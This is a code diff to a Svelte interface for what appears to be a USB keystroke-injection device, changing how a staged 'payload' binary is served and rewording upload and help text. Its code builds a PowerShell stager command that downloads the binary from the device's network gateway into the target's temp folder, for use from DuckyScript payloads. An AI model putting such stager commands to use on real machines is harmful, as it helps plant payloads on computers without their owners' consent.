@@ -75,7 +75,7 @@
     $armoryFiles.find((file) => file.kind !== 'ducky')?.name || 'payload.bin',
   );
   const stagerReference = $derived.by(() => {
-    const assetUrl = `${gatewayUrl}/${sampleAssetName}`;
+    const assetUrl = `${gatewayUrl}/api/armory/${encodeURIComponent(sampleAssetName)}`;
 
     if ($keyboard.os === 'WIN') {
       return `powershell -c "Invoke-WebRequest -Uri '${assetUrl}' -OutFile '$env:TEMP\\${sampleAssetName}'"`;
@@ -369,11 +369,11 @@
             <div class="pointer-events-none flex flex-col items-center gap-1 text-center">
               <CloudUpload size={22} class="text-picobit-text" />
               <p class="m-0 text-xs font-medium text-picobit-text">
-                Drag &amp; drop or click to upload assets
+                Drag &amp; drop or click to upload the binary
               </p>
               <p class="m-0 text-[10px] text-picobit-text-2">
-                Binaries, stagers, or payload elements up to {formatBytes(MAX_ARMORY_FILE_SIZE)}.
-                Stored directly to internal flash hardware.
+                One binary up to {formatBytes(MAX_ARMORY_FILE_SIZE)}. Each upload replaces the
+                previous binary in flash.
               </p>
             </div>
           {/if}
@@ -429,7 +429,7 @@
             <div
               class="rounded-lg border border-picobit-border border-dashed p-4 text-center text-xs text-picobit-text-3"
             >
-              No assets or dependency files staged in flash storage bank.
+              No binary staged in flash storage bank.
             </div>
           {:else}
             <div
@@ -518,9 +518,9 @@
             Network Stager Reference Guide:
           </p>
           <p class="m-0 text-[11px] leading-relaxed text-picobit-text-2">
-            Staged assets are hosted via the virtual NCM web root. Target them dynamically from your
-            DuckyScript payload context above by requesting paths relative to your core hardware
-            gateway:
+            The staged binary is hosted via the virtual NCM web root. Target it dynamically from
+            your DuckyScript payload context above by requesting paths relative to your core
+            hardware gateway:
           </p>
           <div
             class="mt-2 rounded bg-picobit-surface px-2 py-1.5 font-mono text-[11px] text-picobit-text border border-picobit-border-strong break-all select-all"
